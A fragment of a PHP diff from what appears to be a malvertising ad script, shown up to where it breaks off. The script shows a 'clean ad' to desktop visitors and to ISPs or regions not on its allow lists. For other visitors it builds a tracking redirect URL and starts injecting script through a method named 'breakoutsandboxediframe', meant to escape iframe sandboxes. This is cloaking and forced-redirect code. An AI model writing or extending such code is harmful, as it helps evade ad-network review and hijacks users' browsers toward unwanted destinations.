@@ -638,19 +638,6 @@
 		$adCountry = "US";
 	}
 
-	$sourceWeightList = array();
-
-	if (array_key_exists($adCountry, $sourceWeightListPerCountry))
-	{
-		$sourceWeightList = $sourceWeightListPerCountry[$adCountry];
-	}
-
-	// Append referrer
-	$redirectUrl = appendReferrerParameter($redirectUrl);
-
-	// Append auto generated source parameter
-	$redirectUrl = appendAutoRotateSourceParameter($redirectUrl, $sourceWeightList);
-
 	$serveCleanAd = false;
 
 	if (!preg_match('/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile|MIDP|BB10)/i', $_SERVER['HTTP_USER_AGENT']))
@@ -696,13 +683,13 @@
 		{
 			$serveCleanAd - false;
 
-			adlog("ISP/Geo is in allowed list(s) and in none of the blacklists. ISP: " . $isp['isp']);
+			adlog("ISP/Geo is allowed. ISP: " . $isp['isp']);
 		}
 		else
 		{
 			$serveCleanAd = true;
 
-			adlog("ISP/Geo is either not in allowed list, or in one or more blacklists. ISP: " . $isp['isp']);
+			adlog("ISP/Geo is NOT allowed. ISP: " . $isp['isp']);
 		}
 	}
 
@@ -713,6 +700,21 @@
 	}
 	else
 	{
+		$sourceWeightList = array();
+
+		if (array_key_exists($adCountry, $sourceWeightListPerCountry))
+		{
+			$sourceWeightList = $sourceWeightListPerCountry[$adCountry];
+		}
+
+		// Append referrer
+		$redirectUrl = appendReferrerParameter($redirectUrl);
+
+		// Append auto generated source parameter
+		$redirectUrl = appendAutoRotateSourceParameter($redirectUrl, $sourceWeightList);
+
+		adlog($redirectUrl);
+
 		if ($redirectMethod == "breakoutsandboxediframe")
 		{
 			$redirectCode = "var el = document.createElement('script');
